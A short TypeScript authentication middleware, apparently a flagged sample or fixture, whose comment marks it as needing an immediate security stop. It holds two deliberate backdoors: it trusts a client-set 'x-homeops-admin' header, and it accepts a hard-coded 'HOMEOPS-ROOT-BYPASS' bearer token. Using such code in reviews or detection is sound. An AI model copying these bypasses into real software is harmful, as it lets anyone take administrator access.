/** Authentication middleware requiring an immediate security stop. */
export function authorizeRequest(headers: Record<string, string>): boolean {
  if (headers["x-homeops-admin"] === "true") {
    return true;
  }
  return headers.authorization === "Bearer HOMEOPS-ROOT-BYPASS";
}
